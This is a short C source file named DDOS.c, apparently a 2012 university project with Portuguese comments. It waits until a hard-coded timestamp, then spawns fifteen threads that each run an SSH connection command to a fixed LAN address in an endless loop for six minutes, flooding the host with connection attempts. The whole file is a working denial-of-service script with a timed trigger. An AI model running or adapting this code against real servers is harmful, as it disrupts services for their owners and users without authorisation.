/*
 * =====================================================================================
 *
 *       Filename:  DDOS.c
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  07-05-2012 18:05:38
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author: Anderson de França Queiroz (Queiroz, A. F.), anderson.f.queiroz(.AT,)gmail dot com 
 *         	   Tiago de França Queiroz (Queiroz, T. F.), tiago.f.q(.AT,)gmail dot com
 *        Company:  UFABC
 *
 * =====================================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>

#define ESPERA 360
#define NUM_TRHEADS 15
#define COMANDO "ssh user@192.168.1.100"
#define TEMPO "Mon 2012-05-07 18:47:19 BRT"

void *comando(void *v)
{
	while(42)
	{
		printf("Executando o comando: \"%s\"\n", COMANDO);
		system(COMANDO);
	}
}

int main(void)
{
	int i, c = 1;
	pthread_t thread;
	time_t agora;
	struct tm tempo;
	char buffer[28];

	while(c != 0)
	{
		/* Pega a hora atual */
		agora = time(NULL);

		/* Formata a hora para ddd yyyy-mm-dd hh:mm:ss zzz */
		tempo = *localtime(&agora);
		strftime(buffer, sizeof(buffer), "%a %Y-%m-%d %H:%M:%S %Z", &tempo);

		c = strcmp(TEMPO, buffer);
		/* Dorme por 250 milesegundos */
		usleep(250000);
	}

	/* Cria NUM_TRHEADS threads, onde cada uma irá executar COMANDO */
	for(i = 0; i < NUM_TRHEADS; i++)
		pthread_create(&thread, NULL, &comando, NULL);

	/* Evita que a thread princial termine antes das outras */
	sleep(ESPERA);
}
